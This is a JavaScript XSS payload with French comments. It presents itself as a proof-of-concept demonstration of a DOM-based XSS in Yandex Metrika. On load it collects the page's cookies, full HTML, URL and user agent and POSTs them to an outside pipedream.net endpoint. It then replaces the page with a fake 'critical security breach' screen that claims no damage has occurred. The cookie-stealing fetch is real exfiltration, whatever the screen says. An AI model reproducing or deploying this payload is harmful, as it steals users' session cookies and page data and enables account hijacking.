// Fonction pour récupérer les cookies
function grabCookies() {
    return document.cookie;
}

// Fonction pour récupérer tout le HTML de la page
function grabFullHTML() {
    return document.documentElement.outerHTML;
}

// Fonction pour envoyer les données au serveur
function sendDataToServer() {
    const cookies = grabCookies();
    const html = grabFullHTML();
    
    // Créer l'objet de données à envoyer
    const data = {
        cookies: cookies,
        html: html,
        url: window.location.href,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent
    };
    
    // Envoyer les données via une requête POST
    fetch('https://eoppt5zj3no3twu.m.pipedream.net', {
        method: 'POST',
        mode: 'no-cors',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    }).catch(error => {
        console.error('Erreur lors de l\'envoi des données:', error);
    });
}

// Exécuter la fonction d'envoi
sendDataToServer();

// XSS Demonstration - Critical Security Alert Style
(function() {
    const originalContent = document.documentElement.innerHTML;
    const originalTitle = document.title;
    
    document.documentElement.innerHTML = `
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🚨 CRITICAL SECURITY ALERT</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Courier New', monospace;
            background: #000000;
            color: #ff0000;
            min-height: 100vh;
            overflow: hidden;
            position: relative;
        }
        
        .scanlines {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(to bottom, transparent 50%, rgba(255, 0, 0, 0.03) 50%);
            background-size: 100% 4px;
            pointer-events: none;
            z-index: 100;
            animation: scanline 0.8s linear infinite;
        }
        
        .glitch-effect {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbGw9Im5vbmUiLz48L3N2Zz4=');
            opacity: 0.1;
            animation: glitch 5s infinite;
            pointer-events: none;
        }
        
        .alert-container {
            position: relative;
            z-index: 10;
            padding: 40px;
            max-width: 1000px;
            margin: 0 auto;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }
        
        .critical-header {
            text-align: center;
            margin-bottom: 40px;
            animation: pulse-red 2s infinite;
        }
        
        .critical-title {
            font-size: 4em;
            font-weight: bold;
            text-shadow: 0 0 30px #ff0000;
            margin-bottom: 20px;
            letter-spacing: 5px;
        }
        
        .critical-subtitle {
            font-size: 1.5em;
            color: #ff4444;
            text-shadow: 0 0 10px #ff0000;
        }
        
        .countdown {
            font-size: 3em;
            text-align: center;
            margin: 30px 0;
            font-weight: bold;
            color: #ffffff;
            text-shadow: 0 0 20px #ff0000;
        }
        
        .warning-box {
            background: rgba(255, 0, 0, 0.1);
            border: 2px solid #ff0000;
            padding: 25px;
            margin: 20px 0;
            border-radius: 10px;
            box-shadow: 0 0 30px rgba(255, 0, 0, 0.3);
        }
        
        .warning-title {
            font-size: 1.4em;
            font-weight: bold;
            margin-bottom: 15px;
            color: #ff6666;
        }
        
        .warning-content {
            line-height: 1.6;
            color: #ff8888;
        }
        
        .interactive-panel {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin: 30px 0;
        }
        
        .alert-btn {
            background: rgba(255, 0, 0, 0.2);
            border: 1px solid #ff0000;
            color: #ffffff;
            padding: 15px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            cursor: pointer;
            transition: all 0.3s;
            text-align: center;
        }
        
        .alert-btn:hover {
            background: rgba(255, 0, 0, 0.4);
            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
            transform: translateY(-2px);
        }
        
        .crypto-animation {
            text-align: center;
            font-size: 1.2em;
            color: #ff6666;
            margin: 20px 0;
            height: 30px;
            overflow: hidden;
        }
        
        .terminal {
            background: rgba(0, 0, 0, 0.8);
            border: 1px solid #ff0000;
            padding: 20px;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            color: #00ff00;
            height: 200px;
            overflow-y: auto;
            margin-top: 20px;
        }
        
        .terminal-line {
            margin: 5px 0;
            animation: typewriter 0.1s steps(40);
        }
        
        .prompt { color: #00ff00; }
        .command { color: #ffffff; }
        .output { color: #ff6666; }
        
        @keyframes scanline {
            0% { transform: translateY(0px); }
            100% { transform: translateY(4px); }
        }
        
        @keyframes pulse-red {
            0% { opacity: 1; }
            50% { opacity: 0.7; }
            100% { opacity: 1; }
        }
        
        @keyframes glitch {
            0% { transform: translate(0px); }
            20% { transform: translate(-2px, 2px); }
            40% { transform: translate(-2px, -2px); }
            60% { transform: translate(2px, 2px); }
            80% { transform: translate(2px, -2px); }
            100% { transform: translate(0px); }
        }
        
        @keyframes typewriter {
            from { width: 0; }
            to { width: 100%; }
        }
        
        .flashing {
            animation: flash 1s infinite;
        }
        
        @keyframes flash {
            0%, 100% { opacity: 1; }
            50% { opacity: 0; }
        }
    </style>
</head>
<body>
    <div class="scanlines"></div>
    <div class="glitch-effect"></div>
    
    <div class="alert-container">
        <div class="critical-header">
            <div class="critical-title">🛑 CRITICAL SECURITY BREACH</div>
            <div class="critical-subtitle">XSS VULNERABILITY DETECTED</div>
        </div>
        
        <div class="countdown" id="countdown">[DEMONSTRATION MODE]</div>
        
        <div class="warning-box">
            <div class="warning-title">⚠️ SECURITY NOTICE</div>
            <div class="warning-content">
                This page has been compromised by a Cross-Site Scripting (XSS) vulnerability.<br>
                <strong>Proof of Concept Demonstration</strong> - No actual encryption or damage has occurred.<br>
                This is a controlled security test for educational purposes.
            </div>
        </div>
        
        <div class="crypto-animation" id="cryptoAnimation">
            🔒 Simulating security breach pattern...
        </div>
        
        <div class="interactive-panel">
            <button class="alert-btn" onclick="showVulnerabilityDetails()">
                🔍 View Vulnerability Details
            </button>
            <button class="alert-btn" onclick="simulateAttack()">
                ⚡ Simulate Attack Vector
            </button>
            <button class="alert-btn" onclick="showProtectionTips()">
                🛡️ Protection Recommendations
            </button>
            <button class="alert-btn" onclick="restorePage()">
                ↩️ Restore Original Page
            </button>
        </div>
        
        <div class="terminal" id="terminal">
            <div class="terminal-line"><span class="prompt">root@security-demo:~$</span> <span class="command">initiate_xss_poc</span></div>
            <div class="terminal-line"><span class="output">> XSS Payload Injected Successfully</span></div>
            <div class="terminal-line"><span class="output">> DOM Manipulation: COMPLETE</span></div>
            <div class="terminal-line"><span class="output">> Security Override: ACTIVE</span></div>
            <div id="terminalOutput"></div>
        </div>
    </div>

    <script>
        let terminalLines = [
            "> Vulnerability Type: DOM-based XSS",
            "> Risk Level: CRITICAL",
            "> Attack Vector: postMessage + JSON.parse",
            "> Affected Component: Yandex Metrika",
            "> Demonstration Mode: ACTIVE",
            "> User Session: MONITORED",
            "> Data Encryption: SIMULATED",
            "> System Integrity: COMPROMISED",
            "> Ready for security analysis..."
        ];
        
        function addTerminalLine(text) {
            const terminalOutput = document.getElementById('terminalOutput');
            const line = document.createElement('div');
            line.className = 'terminal-line';
            line.innerHTML = `<span class="output">${text}</span>`;
            terminalOutput.appendChild(line);
            terminal.scrollTop = terminal.scrollHeight;
        }
        
        function showVulnerabilityDetails() {
            addTerminalLine("> Displaying vulnerability analysis...");
            alert(`VULNERABILITY ANALYSIS:\n\n• Type: DOM-based XSS\n• Vector: postMessage injection\n• Component: Yandex Metrika\n• Impact: Arbitrary code execution\n• Status: Proof of Concept`);
        }
        
        function simulateAttack() {
            addTerminalLine("> Simulating attack sequence...");
            document.getElementById('cryptoAnimation').innerHTML = "🔓 [SIMULATION] Data extraction pattern activated";
            setTimeout(() => {
                addTerminalLine("> Attack simulation completed");
                document.getElementById('cryptoAnimation').innerHTML = "⚠️ Security breach demonstration finished";
            }, 2000);
        }
        
        function showProtectionTips() {
            addTerminalLine("> Loading security recommendations...");
            alert(`PROTECTION RECOMMENDATIONS:\n\n1. Validate postMessage origins\n2. Sanitize JSON.parse inputs\n3. Implement Content Security Policy\n4. Use HTTPS exclusively\n5. Regular security audits`);
        }
        
        function restorePage() {
            if (confirm("RESTORE ORIGINAL PAGE?\n\nThis will end the security demonstration.")) {
                document.documentElement.innerHTML = originalContent;
                addTerminalLine("> Page restoration initiated...");
            }
        }
        
        // Animated terminal output
        let lineIndex = 0;
        const terminalInterval = setInterval(() => {
            if (lineIndex < terminalLines.length) {
                addTerminalLine(terminalLines[lineIndex]);
                lineIndex++;
            } else {
                clearInterval(terminalInterval);
            }
        }, 500);
        
        // Animated countdown simulation
        let count = 10;
        const countdownElement = document.getElementById('countdown');
        const countdownInterval = setInterval(() => {
            countdownElement.innerHTML = `[DEMO] ${count}s until security lockdown`;
            count--;
            if (count < 0) {
                countdownElement.innerHTML = `[DEMONSTRATION ACTIVE]`;
                countdownElement.classList.add('flashing');
                clearInterval(countdownInterval);
            }
        }, 1000);
        
        // Crypto animation effect
        const cryptoTexts = [
            "🔒 Simulating security breach pattern...",
            "🔓 Analyzing vulnerability impact...",
            "⚠️ Calculating risk assessment...",
            "🚨 Security demonstration active...",
            "✅ Controlled environment verified..."
        ];
        let cryptoIndex = 0;
        setInterval(() => {
            document.getElementById('cryptoAnimation').textContent = cryptoTexts[cryptoIndex];
            cryptoIndex = (cryptoIndex + 1) % cryptoTexts.length;
        }, 2000);
    </script>
</body>
</html>
    `;
})();
